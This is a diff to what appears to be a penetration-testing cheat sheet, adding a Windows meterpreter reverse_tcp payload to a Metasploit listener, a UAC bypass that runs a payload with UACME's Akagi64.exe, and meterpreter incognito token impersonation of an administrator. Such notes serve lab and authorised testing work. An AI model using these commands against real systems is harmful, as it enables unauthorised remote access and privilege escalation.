@@ -635,7 +635,8 @@ nc -nvlp 4444
 ```
 Metasploit listener
 ```
-use exploit/multi/handler
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
 ```
 
 #### Shell Stabilization
@@ -662,6 +663,27 @@ sudo -l
 cat /etc/sudoers
 ```
 
+
+#### Bypassing UAC 
+
+Bypassing UAC using the [UACME](https://github.com/hfiref0x/UACME) tool. We need to compile this into binaries first! Such a bad day for skript kiddies :(
+```
+Akagi64.exe 23 C:\Temp\payload.exe
+```
+
+
+
+#### Token Impersonation
+
+Here, we are looking for `SeImpersonatePrivilege` when we run `getprivs` command.
+
+```
+meterpreter > load incognito 
+Loading extension incognito...Success.
+
+meterpreter > list_tokens -u
+meterpreter > impersonate_token "SYSTEM\Administrator"
+```
 
 #### Very Handy Links ;)
 
